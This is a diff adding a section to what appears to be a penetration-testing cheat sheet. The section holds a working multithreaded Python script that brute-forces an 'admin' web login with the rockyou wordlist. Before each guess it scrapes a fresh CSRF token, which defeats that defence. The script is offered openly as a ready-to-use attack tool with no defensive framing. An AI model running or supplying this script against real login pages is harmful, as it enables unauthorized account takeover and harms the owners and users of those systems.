@@ -1909,7 +1909,87 @@ Use custom key file for ssh
 
     ssh root@ip -i privKey.pem
 
+**Brute Force CSRF Token**
 
+Python Script to brute force a password based on the rockyou wordlist entering every time a new csrf token that is extracted from the page.
+
+    import requests
+    import re
+    import threading
+    from queue import Queue
+    
+    # Parameters provided
+    url = 'http://adress/login'
+    wordlist_path = '/usr/share/wordlists/rockyou.txt'
+    username = 'admin'  # Username set to 'admin'
+    
+    # Function to extract CSRF token
+    def extract_csrf_token(content):
+        # Adjusted regex pattern to account for possible whitespaces
+        match = re.search(r'name\s*=\s*"login-(\d+\.\d+)"', content)
+        if match:
+            return match.group(1)
+        else:
+            print("CSRF token not found.")
+            return None
+    
+    # Function to attempt login with a password and CSRF token
+    def attempt_login(password, csrf_token):
+        # Replace $1 with the password and $2 with the CSRF token
+        data = f"username={username}&password={password}&login-{csrf_token}="
+        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+        try:
+            response = requests.post(url, data=data, headers=headers)
+            # Print the status code and the size of the response
+            print(f"Password: {password} | Status Code: {response.status_code} | Response Size: {len(response.content)}")
+            return response
+        except Exception as e:
+            print(f"An error occurred during login attempt: {e}")
+            return None
+    
+    # Worker function for the threads
+    def worker(queue):
+        while not queue.empty():
+            password = queue.get()
+            try:
+                # Get a new CSRF token for each attempt
+                response = requests.get(url)
+                csrf_token = extract_csrf_token(response.text)
+                if csrf_token:
+                    login_response = attempt_login(password, csrf_token)
+                else:
+                    print("Failed to retrieve CSRF token.")
+            except Exception as e:
+                print(f"An error occurred: {e}")
+            finally:
+                queue.task_done()
+    
+    # Load the wordlist
+    with open(wordlist_path, 'r', errors='ignore') as file:
+        passwords = file.read().splitlines()
+    
+    # Create a queue and add all the passwords to it
+    queue = Queue()
+    for password in passwords:
+        queue.put(password)
+    
+    # Number of threads
+    num_threads = 10
+    
+    # Start the threads
+    threads = []
+    for i in range(num_threads):
+        thread = threading.Thread(target=worker, args=(queue,))
+        thread.start()
+        threads.append(thread)
+    
+    # Wait for all threads to finish
+    for thread in threads:
+        thread.join()
+    
+    print("Finished processing wordlist.")
+
+    
 
 
 
